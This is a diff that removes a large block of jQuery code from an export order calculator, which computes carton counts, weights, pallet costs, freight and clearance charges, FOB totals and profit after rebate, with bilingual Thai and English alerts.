-    const net_weight = $this.parent().find('input.net_weight').val();
-    const maxcbm = $this.parent().find('input.maxcbm').val();
-    const maxpallet = $this.parent().find('input.maxpallet').val();
-    const select_palletized = $('#select_pallet').val();
-
-    let total_box = 0;
-    let total_nw = 0;
-    let total_gw = 0;
-    let total_cbm = 0;
-    let palletized = 0;
-    $this.parent().parent().find('td:nth-child(5) input.itf_clearance_price').val(null);
-    $this.parent().parent().find('td:nth-child(5) input.itf_transport_price').val(null);
-    $this.parent().parent().find('td:nth-child(5) input.itf_cost_price').val(null);
-    $this.parent().parent().find('td:nth-child(5) input.total_itf_cost').val(null);
-    $this.parent().parent().find('td:nth-child(5) input.itf_freight_rate').val(null);
-    // $this.parent().parent().find('td:nth-child(6) input.unit_price').val(null);
-    $this.parent().parent().find('td:nth-child(7) input.profit').val(null);
-    if(id == 1){
-        const cal = parseFloat(qty)/parseFloat(ean_qty);
-        $this.parent().parent().find('td:nth-child(4) input.number_box').val(parseInt(cal));
-    }else if(id == 2){
-        const cal = parseFloat(qty)/parseFloat(net_weight);
-        $this.parent().parent().find('td:nth-child(4) input.number_box').val(parseInt(cal));
-    }else if(id == 4){
-        $this.parent().parent().find('td:nth-child(4) input.number_box').val(qty);
-    }
-    const nw = parseFloat($this.parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat(net_weight);
-    $this.parent().parent().find('td:nth-child(5) input.nw').val(nw.toFixed(2));
-    const cbm = parseFloat($this.parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat(maxcbm);
-    $this.parent().parent().find('td:nth-child(5) input.cbm').val(cbm.toFixed(2));
-    if(maxpallet != 0){
-        const pallet = parseFloat($this.parent().parent().find('td:nth-child(4) input.number_box').val())/parseFloat(maxpallet);
-        $this.parent().parent().find('td:nth-child(5) input.pallet').val(pallet.toFixed(2));
-    }else{
-        $this.parent().parent().find('td:nth-child(5) input.pallet').val(0);
-    }
-    
-
-    if(id != '' && qty != ''){
-        const time = $('#sorted_table tbody tr').length*1000;
-        loading(time);
-        let check = {};
-        const num_box = $this.parent().parent().find('td:nth-child(4) input.number_box').val();
-        if(count_ean_id > 1){
-            $.each(ean_id,function($key,$val){
-                ean = parseFloat(ean_qty)/count_ean_id;
-                var pc = parseFloat(num_box)*ean;
-                check[$val] = pc;
-            })
-        }else{
-            ean = parseFloat(ean_qty)
-            var pc = parseFloat(num_box)*ean;
-            check[ean_id] = pc;
-        }
-        $.each($('.ean_id'),function(){
-            const count_ean_id2 = $(this).val().split(',').length;
-            if($(this).parent().parent().find('td:nth-child(1) select.select_itf').val() != itf_id){
-                var id = $(this).val().split(',');
-                var number_box = $(this).parent().parent().find('td:nth-child(4) input.number_box').val();
-                var qty = $(this).parent().parent().find('input.ean_qty').val();
-                if(count_ean_id2 > 1){
-                    $.each($(this).val().split(','),function($key,$val){
-                        var ean2 = parseFloat(qty)/count_ean_id2
-                        var pc2 = parseFloat(number_box)*ean2;
-                        if($val in check){
-                            check[$val] += pc2;
-                        }
-                    })
-                }else{
-                    var ean2 = parseFloat(qty);
-                    var pc2 = parseFloat(number_box)*ean2;
-                    if(id in check){
-                        check[id] += pc2;
-                    }
-                }
-                // reCost($(this).parent().parent().find('td:nth-child(1) select.select_itf').val());
-            }
-        })
-        var myJSON = JSON.stringify(check);
-        $.ajax({
-            url: FULLURL+'/checkpacking',
-            method:'get',
-            data: {check:myJSON,itf_id:itf_id,num_box:num_box},
-            success:function(data){
-                $.each(data.rs,function(k,v){
-                    if(v == 'true' && data.rs_re[k] == 'true'){
-                        if(data.count[k] != 0){
-                            $.get(FULLURL+'/getCost?id='+itf_id+'&num_box='+num_box)
-                            .done(function(data){
-                                $this.parent().parent().find('td:nth-child(5) input.itf_cost_price').val(data.cost.toFixed(4));
-                            })
-                            // setTimeout(function(){
-                            // $.get(FULLURL+'/getAverage?check='+myJSON)
-                            //     .done(function(aver){
-                            //         $.each($('.ean_id'),function(){
-                            //             if($(this).val() == ean_id){
-                            //                 $(this).parent().find('input.average_lot').val(aver);
-                            //             }
-                            //         })
-                            //     })
-                            // },time)
-                            // $this.parent().parent().find('td:nth-child(8) button.calculate-row').removeAttr("disabled", "disabled");
-                            // $this.parent().parent().find('td:nth-child(8) button.update-row').removeAttr("disabled", "disabled");
-                            // $this.parent().parent().attr('style','background-color:#8cff8c');
-                        }
-                    }else{
-                        // $.each($('.ean_id'),function(){
-                        //     const id = $(this).val()
-                        //     if(k == id){
-                        //         $(this).parent().parent().attr('style','background-color:#fd4558');
-                        //     }
-                        // })
-                        if(data.count[k] == 0 && parseFloat(data.sum[k]) == 0){
-                            alert('ไม่มีสินค้าที่แพ็คแล้ว / No products have been packed.')
-                            $this.parent().parent().find('td:nth-child(1) select.select_itf').val(null).trigger('change');
-                            $this.parent().parent().find('td:nth-child(2) input.qty').val(null);
-                            $this.parent().parent().find('td:nth-child(2) input.ean_id').val(null);
-                            $this.parent().parent().find('td:nth-child(2) input.ean_qty').val(null);
-                            $this.parent().parent().find('td:nth-child(2) input.net_weight').val(null);
-                            $this.parent().parent().find('td:nth-child(2) input.new_weight').val(null);
-                            $this.parent().parent().find('td:nth-child(2) input.maxcbm').val(null);
-                            $this.parent().parent().find('td:nth-child(2) input.maxpallet').val(null);
-                            $this.parent().parent().find('td:nth-child(3) select.unitcount').val(null);
-                            $this.parent().parent().find('td:nth-child(4) input.number_box').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.nw').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.gw_weight').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.cbm').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.pallet').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.price_allocation').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.itf_clearance_price').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.itf_transport_price').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.itf_cost_price').val(null);
-                            $this.parent().parent().find('td:nth-child(5) input.freight_rate').val(null);
-                            $this.parent().parent().find('td:nth-child(6) input.unit_price').val(null);
-                        }
-                        // else if(data.count[k] != 0 && parseFloat(data.sum[k]) < check[k]){
-                        //     alert('จำนวนไม่เพียงพอ มีจำนวน '+data.name[k]+' ที่แพ็คแล้ว '+data.sum[k]+' / Not enough There are a number of '+data.name[k]+' that have been packaged '+data.sum[k])
-                        //     $this.parent().parent().find('td:nth-child(2) input.qty').val(null);
-                        //     $this.parent().parent().find('td:nth-child(3) select.unitcount').val(null);
-                        //     $this.parent().parent().find('td:nth-child(4) input.number_box').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.nw').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.gw_weight').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.cbm').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.pallet').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.price_allocation').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.itf_clearance_price').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.itf_transport_price').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.itf_cost_price').val(null);
-                        //     $this.parent().parent().find('td:nth-child(5) input.freight_rate').val(null);
-                        //     $this.parent().parent().find('td:nth-child(6) input.unit_price').val(null);
-                        // }
-                        $.each(data.count_re,function($key,$val){
-                            if($val == 0 && parseFloat(data.sum_re[$key]) == 0){
-                                alert('ไม่มีส่วนประกอบ / No product setup.')
-                                $this.parent().parent().find('td:nth-child(1) select.select_itf').val(null).trigger('change');
-                                $this.parent().parent().find('td:nth-child(2) input.qty').val(null);
-                                $this.parent().parent().find('td:nth-child(2) input.ean_id').val(null);
-                                $this.parent().parent().find('td:nth-child(2) input.ean_qty').val(null);
-                                $this.parent().parent().find('td:nth-child(2) input.net_weight').val(null);
-                                $this.parent().parent().find('td:nth-child(2) input.new_weight').val(null);
-                                $this.parent().parent().find('td:nth-child(2) input.maxcbm').val(null);
-                                $this.parent().parent().find('td:nth-child(2) input.maxpallet').val(null);
-                                $this.parent().parent().find('td:nth-child(3) select.unitcount').val(null);
-                                $this.parent().parent().find('td:nth-child(4) input.number_box').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.nw').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.gw_weight').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.cbm').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.pallet').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.price_allocation').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.itf_clearance_price').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.itf_transport_price').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.itf_cost_price').val(null);
-                                $this.parent().parent().find('td:nth-child(5) input.freight_rate').val(null);
-                                $this.parent().parent().find('td:nth-child(6) input.unit_price').val(null);
-                            }
-                            // else if($val != 0 && parseFloat(data.sum_re[$key]) < pc){
-                            //     alert('จำนวนไม่เพียงพอ มีจำนวน '+data.name_re[$key]+' '+data.sum[$key]+' / Not enough There are a number of '+data.name_re[$key]+' '+data.sum[$key])
-                            //     $this.parent().parent().find('td:nth-child(2) input.qty').val(null);
-                            //     $this.parent().parent().find('td:nth-child(3) select.unitcount').val(null);
-                            //     $this.parent().parent().find('td:nth-child(4) input.number_box').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.nw').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.gw_weight').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.cbm').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.pallet').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.price_allocation').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.itf_clearance_price').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.itf_transport_price').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.itf_cost_price').val(null);
-                            //     $this.parent().parent().find('td:nth-child(5) input.freight_rate').val(null);
-                            //     $this.parent().parent().find('td:nth-child(6) input.unit_price').val(null);
-                            // }
-                        })
-                    }
-                })
-            }
-        })
-        $.each($('input.number_box'),function(){
-            const box = parseFloat($(this).val());
-            total_box += box;
-        })
-        $('#span_box').html(total_box);
-        $('#total_box').val(total_box);
-    
-        $.each($('input.nw'),function(){
-            const nw = parseFloat($(this).val());
-            total_nw += nw;
-        })
-        $('#span_nw').html(total_nw);
-        $('#total_nw').val(total_nw);
-    }
-
-    if(select_palletized == 'yes'){
-        $.each($('input.pallet'),function(){
-            const pallet = parseFloat($(this).val());
-            palletized += pallet;
-            const one = pallet/palletized;
-            $('#palletized').val(Math.ceil(palletized));
-            $('#span_palletized').html(Math.ceil(palletized));
-            const total_pallet = parseFloat($('#palletized').val());
-            const price_pallet = parseFloat($('#price_pallet').val());
-            const two = total_pallet*price_pallet;
-            const price_allocation = parseFloat(one)*parseFloat(two);
-            $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(Math.ceil(price_allocation));
-            const qty = $(this).parent().parent().find('td:nth-child(2) input.qty').val();
-            const allocation = $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val();
-            const price_pallet_unit = parseFloat(allocation)/parseFloat(qty);
-            $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(price_pallet_unit.toFixed(4));
-
-            const palletized_price = (price_pallet*total_pallet)/palletized;
-            $('#palletized_price').val(palletized_price.toFixed(4));
-        })
-
-        $.each($('input.gw_weight'),function(){
-            const pallet_weight = (parseFloat($('#weight_pallet').val())*parseFloat($('#palletized').val()))/parseFloat(palletized);
-            const gw = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
-            const gw_weight = parseFloat(gw)+(parseFloat($(this).parent().find('input.pallet').val())*parseFloat(pallet_weight))
-            $(this).val(gw_weight.toFixed(2));
-        })
-
-        $.each($('input.itf_pallet_price'),function(){
-            const palletized_price = parseFloat($('#palletized_price').val());
-            const pallet = parseFloat($(this).parent().find('input.pallet').val());
-            const itf_pallet_price = pallet*palletized_price;
-            $(this).val(itf_pallet_price.toFixed(4));
-        })
-
-        $.each($('input.gw_weight'),function(){
-            const gw_weight = parseFloat($(this).val());
-            total_gw += gw_weight;
-        })
-        // const weight_pallet = parseFloat($('#weight_pallet').val());
-        // const cal_gw = parseFloat(total_gw)+(parseFloat($('#palletized').val())*parseFloat(weight_pallet));
-        $('#span_gw').html(total_gw.toFixed(2));
-        $('#total_gw').val(total_gw.toFixed(2));
-        
-        $.each($('input.cbm'),function(){
-            const cbm = parseFloat($(this).val());
-            total_cbm += cbm;
-        })
-        const cbm_pallet = parseFloat($('#cbm_pallet').val());
-        const cal_cbm = parseFloat(total_cbm)+(parseFloat($('#palletized').val())*parseFloat(cbm_pallet));
-        $('#span_cbm').html(cal_cbm.toFixed(2));
-        $('#total_cbm').val(cal_cbm.toFixed(2));
-    }else{
-        const gw_weight = parseFloat($this.parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat($this.parent().parent().find('td:nth-child(2) input.new_weight').val());
-        $this.parent().parent().find('td:nth-child(5) input.gw_weight').val(gw_weight.toFixed(2));
-
-        $.each($('input.maxpallet'),function(){
-            $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(palletized);
-            $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(palletized);
-            $(this).parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(palletized);
-        })
-
-        $.each($('input.gw_weight'),function(){
-            const gw_weight = parseFloat($(this).val());
-            total_gw += gw_weight;
-        })
-        $('#span_gw').html(total_gw.toFixed(2));
-        $('#total_gw').val(total_gw.toFixed(2));
-
-        $.each($('input.cbm'),function(){
-            const cbm = parseFloat($(this).val());
-            total_cbm += cbm;
-        })
-        $('#span_cbm').html(total_cbm.toFixed(2));
-        $('#total_cbm').val(total_cbm.toFixed(2));
-    }
-})
-
-$(document).on('change','.unit_price',function(){
-    var $this = $(this);
-    const qty = parseFloat($this.parent().parent().parent().find('td:nth-child(2) input.qty').val());
-    const total_itf_cost = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.total_itf_cost').val());
-    const itf_freight_rate = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_freight_rate').val());
-    const unit_price = parseFloat($this.val());
-    const ex_rate = parseFloat($('#ex_rate').val())
-    const profit = ((unit_price*ex_rate*qty)-total_itf_cost)/total_itf_cost*100;
-    $this.parent().parent().parent().find('td:nth-child(7) input.profit').val(profit.toFixed(2));
-    const fob_th = (unit_price*ex_rate*qty)-itf_freight_rate;
-    $this.parent().parent().parent().find('td:nth-child(7) input.fob').val(fob_th.toFixed(4));
-
-    let fob = 0;
-    let total_all_cost = 0;
-    let profit_before_rebate = 0;
-    let profit_after_rebate = 0;
-    setTimeout(function(){
-        $.each($('.unit_price'),function(){
-            var $this = $(this);
-            const unit_price = parseFloat($this.val());
-            const qty = parseFloat($this.parent().parent().parent().find('td:nth-child(2) input.qty').val());
-            const ex_rate = parseFloat($('#ex_rate').val())
-            fob += unit_price*ex_rate*qty;
-        })
-        const total_fob = fob-$('#total_freight').val();
-        $('#span_fob').text(total_fob.toFixed(2));
-        $('#total_fob').val(total_fob.toFixed(2));
-        $.each($('.total_itf_cost'),function(){
-            var $this = $(this);
-            const total_itf_cost = parseFloat($this.val());
-            total_all_cost += total_itf_cost;
-        })
-        profit_before_rebate = fob-total_all_cost;
-        $('#span_pro_before_rebate').text(profit_before_rebate.toFixed(2));
-        $('#total_pro_before_rebate').val(profit_before_rebate.toFixed(2));
-    },500)
-    setTimeout(function(){
-        if($('#total_pro_before_rebate').val() != ''){
-            const rebate = parseFloat($('#rebate').val());
-            if($('#rebate').val() != ''){
-                profit_after_rebate = rebate*profit_before_rebate-(rebate/100*fob);
-                $('#span_pro_after_rebate').text(profit_after_rebate.toFixed(2));
-                $('#total_pro_after_rebate').val(profit_after_rebate.toFixed(2));
-                const profit_percent = 1.5*profit_after_rebate/total_all_cost*100;
-                $('#span_pro_percent').text(profit_percent.toFixed(2));
-                $('#total_pro_percent').val(profit_percent.toFixed(2));
-            }else{
-                alert('กรุณากรอก Rebate แล้วกดคำนวณอีกครั้ง / Please enter Rebate then press calculate again')
-            }
-        }
-    },1000)
-})
-
-$(document).on('click','.calculate-row',function(){
-    const time = $('#sorted_table tbody tr').length*1000;
-    loading(time);
-    const select_clearance = $('#select_clearance').val();
-    var $this = $(this);
-
-    let total_nw = $('#total_nw').val();
-    let total_gw = $('#total_gw').val();
-    let total_cbm = $('#total_cbm').val();
-    let palletized = $('#palletized').val();
-    let fob = 0;
-    let total_all_cost = 0;
-    let profit_before_rebate = 0;
-    let profit_after_rebate = 0;
-
-    if(select_clearance != ''){
-        const clearance = parseFloat($('#clearance').val());
-        const clearance_price = clearance/total_nw;
-        $('#clearance_price').val(clearance_price);
-        $.each($('input.itf_clearance_price'),function(){
-        const nw = $(this).parent().find('input.nw').val();
-        const itf_clearance_price = parseFloat($('#clearance_price').val())*parseFloat(nw);
-        $(this).val(itf_clearance_price.toFixed(4))
-        })
-
-        $.ajax({
-            url: FULLURL+'/compareTransport',
-            method:'get',
-            data: {total_nw:total_nw,total_cbm:total_cbm,select_clearance:select_clearance,pallet:palletized},
-            success:function(data){
-                $('#transport').val(data);
-                const transport = parseFloat($('#transport').val());
-                const transport_price = transport/total_nw;
-                $('#transport_price').val(transport_price);
-                $.each($('input.itf_transport_price'),function(){
-                    const itf_transport_price = parseFloat($('#transport_price').val())*parseFloat($(this).parent().find('input.nw').val());
-                    $(this).val(itf_transport_price.toFixed(4))
-                    // $(this).val(transport.toFixed(4))
-                })
-            }
-        })
-    }else{
-        alert('กรุณาเลือก Clearance แล้วกดคำนวณอีกครั้ง / Please select Clearance then press calculate again')
-    }
-
-    if($('#airport').val() != "" && $('#airline').val() != ""){
-            $.ajax({
-                url: FULLURL+'/getRate',
-                method:'get',
-                data: {total_gw:total_gw,clear:$('#select_clearance').val(),destination:$('#airport').val(),airline:$('#airline').val()},
-                success:function(data){
-                    $.each($('.itf_freight_rate'),function(){
-                        var $this = $(this);
-                        const gw = $this.parent().find('input.gw_weight').val();
-                        const itf_freight_rate = parseFloat(data.nego_rate)*parseFloat(gw);
-                        $this.val(itf_freight_rate.toFixed(4));
-
-                        const total_freight_rate = parseFloat(data.nego_rate)*parseFloat(total_gw);
-                        $('#span_freight').text(total_freight_rate.toFixed(4));
-                        $('#total_freight').val(total_freight_rate.toFixed(4));
-                    })
-                }
-            })
-    }else{
-        alert('กรุณาเลือก Airport และ Airline แล้วกดคำนวณอีกครั้ง / Please select Airport and Airline then press calculate again');
-    }
-
-    setTimeout(function(){
-        $.each($('.total_itf_cost'),function(){
-            var $this = $(this);
-            const pallet_price = $this.parent().find('input.itf_pallet_price').val();
-            const clearance_price = $this.parent().find('input.itf_clearance_price').val();
-            const transport_price = $this.parent().find('input.itf_transport_price').val();
-            const cost_price = $this.parent().find('input.itf_cost_price').val();
-            const freight_rate = $this.parent().find('input.itf_freight_rate').val();
-            if(pallet_price != "" && clearance_price != "" && transport_price != "" && cost_price != "" && freight_rate != ""){
-                const total_itf_cost = parseFloat(pallet_price)+parseFloat(clearance_price)+parseFloat(transport_price)+parseFloat(cost_price)+parseFloat(freight_rate);
-                $this.val(total_itf_cost.toFixed(4));
-            }
-        })
-    },700)
-    setTimeout(function(){
-        if($('.total_itf_cost').val() != ''){
-            // $.each($('.unit_price'),function(){
-            //     var $this = $(this);
-                const total_itf_cost = parseFloat($this.parent().parent().find('td:nth-child(5) input.total_itf_cost').val());
-                const qty = parseFloat($this.parent().parent().find('td:nth-child(2) input.qty').val());
-                const unit_price = total_itf_cost / qty;
-                const markup_rate = parseFloat($('#markup_rate').val())
-                const ex_rate = parseFloat($('#ex_rate').val())
-                if(markup_rate >= 0 && ex_rate >= 0){
-                    const cal = (1+((0.0198*(Math.pow(markup_rate,2))+(0.7901*markup_rate)+1.26)/100))*unit_price/ex_rate;
-                    $this.parent().parent().find('input.unit_price').val(cal.toFixed(2));
-                }else{
-                    alert('กรุณาเลือก Currency และ EX Rate และ Markup Rate แล้วกดคำนวณอีกครั้ง / Please select Currency and EX Rate and Markup Rate then press calculate again');
-                }
-                
-            // })
-        }
-    },900)
-    setTimeout(function(){
-        if($('.unit_price').val() != ''){
-            // $.each($('.profit'),function(){
-            //     var $this = $(this);
-                const qty = parseFloat($this.parent().parent().find('td:nth-child(2) input.qty').val());
-                const total_itf_cost = parseFloat($this.parent().parent().find('td:nth-child(5) input.total_itf_cost').val());
-                const itf_freight_rate = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_freight_rate').val());
-                const unit_price = parseFloat($this.parent().parent().find('td:nth-child(6) input.unit_price').val());
-                const ex_rate = parseFloat($('#ex_rate').val())
-                const profit = ((unit_price*ex_rate*qty)-total_itf_cost)/total_itf_cost*100;
-                $this.parent().parent().find('input.profit').val(profit.toFixed(2));
-                const fob_th = (unit_price*ex_rate*qty)-itf_freight_rate;
-                $this.parent().parent().find('input.fob').val(fob_th.toFixed(4));
-            // })
-        }
-    },1100)
-
-    setTimeout(function(){
-        if($('.unit_price').val() != ''){
-            $.each($('.unit_price'),function(){
-                var $this = $(this);
-                const unit_price = parseFloat($this.val());
-                const qty = parseFloat($this.parent().parent().parent().find('td:nth-child(2) input.qty').val());
-                const ex_rate = parseFloat($('#ex_rate').val())
-                fob += unit_price*ex_rate*qty;
-            })
-            const total_fob = fob-$('#total_freight').val();
-            $('#span_fob').text(total_fob.toFixed(2));
-            $('#total_fob').val(total_fob.toFixed(2));
-            $.each($('.total_itf_cost'),function(){
-                var $this = $(this);
-                const total_itf_cost = parseFloat($this.val());
-                total_all_cost += total_itf_cost;
-            })
-            profit_before_rebate = fob-total_all_cost;
-            $('#span_pro_before_rebate').text(profit_before_rebate.toFixed(2));
-            $('#total_pro_before_rebate').val(profit_before_rebate.toFixed(2));
-        }
-    },1300)
-
-    setTimeout(function(){
-        if($('#total_pro_before_rebate').val() != ''){
-            const rebate = parseFloat($('#rebate').val());
-            if($('#rebate').val() != ''){
-                profit_after_rebate = profit_before_rebate-(rebate/100*fob);
-                $('#span_pro_after_rebate').text(profit_after_rebate.toFixed(2));
-                $('#total_pro_after_rebate').val(profit_after_rebate.toFixed(2));
-                const profit_percent = (profit_after_rebate/total_all_cost)*100;
-                $('#span_pro_percent').text(profit_percent.toFixed(2));
-                $('#total_pro_percent').val(profit_percent.toFixed(2));
-            }else{
-                alert('กรุณากรอก Rebate แล้วกดคำนวณอีกครั้ง / Please enter Rebate then press calculate again')
-            }
-        }
-        $.ajax({
-            url: FULLURL+'/getRate',
-            method:'get',
-            data: {total_gw:total_gw,clear:$('#select_clearance').val(),destination:$('#airport').val(),airline:$('#airline').val()},
-            success:function(data){
-                if(data.min > total_gw){
-                    alert("min GW requirment not met. please increase order to min GW of "+total_gw+' to more than '+data.min);
-                }
-            }
-        })
-    },1500)
-})
-
-$(document).on('click','.update-row',function(){
-    const time = $('#sorted_table tbody tr').length*2000;
-    loading(time);
-    var $this = $(this);
-
-    const select_clearance = $('#select_clearance').val();
-    let total_nw = $('#total_nw').val();
-    let total_gw = $('#total_gw').val();
-    let total_cbm = $('#total_cbm').val();
-    let palletized = $('#palletized').val();
-    let fob = 0;
-    let total_all_cost = 0;
-    let profit_before_rebate = 0;
-    let profit_after_rebate = 0;
-
-    if(select_clearance != ''){
-        const clearance = parseFloat($('#clearance').val());
-        const clearance_price = clearance/total_nw;
-        $('#clearance_price').val(clearance_price);
-        $.each($('input.itf_clearance_price'),function(){
-        const nw = $(this).parent().find('input.nw').val();
-        const itf_clearance_price = parseFloat($('#clearance_price').val())*parseFloat(nw);
-        $(this).val(itf_clearance_price.toFixed(4))
-        })
-
-        $.ajax({
-            url: FULLURL+'/compareTransport',
-            method:'get',
-            data: {total_nw:total_nw,total_cbm:total_cbm,select_clearance:select_clearance,pallet:palletized},
-            success:function(data){
-                $('#transport').val(data);
-                const transport = parseFloat($('#transport').val());
-                const transport_price = transport/total_nw;
-                $('#transport_price').val(transport_price);
-                $.each($('input.itf_transport_price'),function(){
-                    const itf_transport_price = parseFloat($('#transport_price').val())*parseFloat($(this).parent().find('input.nw').val());
-                    $(this).val(itf_transport_price.toFixed(4))
-                    // $(this).val(transport.toFixed(4))
-                })
-            }
-        })
-    }else{
-        alert('กรุณาเลือก Clearance แล้วกดคำนวณอีกครั้ง / Please select Clearance then press calculate again')
-    }
-
-    if($('#airport').val() != "" && $('#airline').val() != ""){
-        
-            $.ajax({
-                url: FULLURL+'/getRate',
-                method:'get',
-                data: {total_gw:total_gw,clear:$('#select_clearance').val(),destination:$('#airport').val(),airline:$('#airline').val()},
-                success:function(data){
-                    $.each($('.itf_freight_rate'),function(){
-                        var $this = $(this);
-                        const gw = $this.parent().find('input.gw_weight').val();
-                        const itf_freight_rate = parseFloat(data.nego_rate)*parseFloat(gw);
-                        $this.val(itf_freight_rate.toFixed(4));
-
-                    })
-                        const total_freight_rate = parseFloat(data.nego_rate)*parseFloat(total_gw);
-                        $('#span_freight').text(total_freight_rate.toFixed(2));
-                        $('#total_freight').val(total_freight_rate.toFixed(2));
-                }
-            })
-        
-    }else{
-        alert('กรุณาเลือก Airport และ Airline แล้วกดคำนวณอีกครั้ง / Please select Airport and Airline then press calculate again');
-    }
-
-    setTimeout(function(){
-        $.each($('.total_itf_cost'),function(){
-            var $this = $(this);
-            const pallet_price = $this.parent().find('input.itf_pallet_price').val();
-            const clearance_price = $this.parent().find('input.itf_clearance_price').val();
-            const transport_price = $this.parent().find('input.itf_transport_price').val();
-            const cost_price = $this.parent().find('input.itf_cost_price').val();
-            const freight_rate = $this.parent().find('input.itf_freight_rate').val();
-            if(pallet_price != "" && clearance_price != "" && transport_price != "" && cost_price != "" && freight_rate != ""){
-                const total_itf_cost = parseFloat(pallet_price)+parseFloat(clearance_price)+parseFloat(transport_price)+parseFloat(cost_price)+parseFloat(freight_rate);
-                $this.val(total_itf_cost.toFixed(4));
-            }
-        })
-    },1000)
-
-    setTimeout(function(){
-        if($('.unit_price').val() != ''){
-            // $.each($('.profit'),function(){
-            //     var $this = $(this);
-            const qty = parseFloat($this.parent().parent().find('td:nth-child(2) input.qty').val());
-            const total_itf_cost = parseFloat($this.parent().parent().find('td:nth-child(5) input.total_itf_cost').val());
-            const itf_freight_rate = parseFloat($this.parent().parent().parent().find('td:nth-child(5) input.itf_freight_rate').val());
-            const unit_price = parseFloat($this.parent().parent().find('td:nth-child(6) input.unit_price').val());
-            const ex_rate = parseFloat($('#ex_rate').val())
-            const profit = ((unit_price*ex_rate*qty)-total_itf_cost)/total_itf_cost*100;
-            $this.parent().parent().find('input.profit').val(profit.toFixed(2));
-            const fob_th = (unit_price*ex_rate*qty)-itf_freight_rate;
-            $this.parent().parent().find('input.fob').val(fob_th.toFixed(4));
-            // })
-        }
-    },1500)
-
-    setTimeout(function(){
-        if($('.unit_price').val() != ''){
-            $.each($('.unit_price'),function(){
-                var $this = $(this);
-                const unit_price = parseFloat($this.val());
-                const qty = parseFloat($this.parent().parent().parent().find('td:nth-child(2) input.qty').val());
-                const ex_rate = parseFloat($('#ex_rate').val())
-                fob += unit_price*ex_rate*qty;
-            })
-            const total_fob = fob-$('#total_freight').val();
-            $('#span_fob').text(total_fob.toFixed(2));
-            $('#total_fob').val(total_fob.toFixed(2));
-            $.each($('.total_itf_cost'),function(){
-                var $this = $(this);
-                const total_itf_cost = parseFloat($this.val());
-                total_all_cost += total_itf_cost;
-            })
-            profit_before_rebate = fob-total_all_cost;
-            $('#span_pro_before_rebate').text(profit_before_rebate.toFixed(2));
-            $('#total_pro_before_rebate').val(profit_before_rebate.toFixed(2));
-        }
-    },2000)
-
-    setTimeout(function(){
-        if($('#total_pro_before_rebate').val() != ''){
-            const rebate = parseFloat($('#rebate').val());
-            if($('#rebate').val() != ''){
-                profit_after_rebate = profit_before_rebate-(rebate/100*fob);
-                $('#span_pro_after_rebate').text(profit_after_rebate.toFixed(2));
-                $('#total_pro_after_rebate').val(profit_after_rebate.toFixed(2));
-                const profit_percent = profit_after_rebate/total_all_cost*100;
-                $('#span_pro_percent').text(profit_percent.toFixed(2));
-                $('#total_pro_percent').val(profit_percent.toFixed(2));
-            }else{
-                alert('กรุณากรอก Rebate แล้วกดคำนวณอีกครั้ง / Please enter Rebate then press calculate again')
-            }
-        }
-        $.ajax({
-            url: FULLURL+'/getRate',
-            method:'get',
-            data: {total_gw:total_gw,clear:$('#select_clearance').val(),destination:$('#airport').val(),airline:$('#airline').val()},
-            success:function(data){
-                if(data.min > total_gw){
-                    alert("min GW requirment not met. please increase order to min GW of "+total_gw+' to more than '+data.min);
-                }
-            }
-        })
-    },2000)
-})
 
 function loading(time){
     swal.fire({
@@ -1241,7 +845,7 @@ function loading(time){
           swal.showLoading();
         }
     })
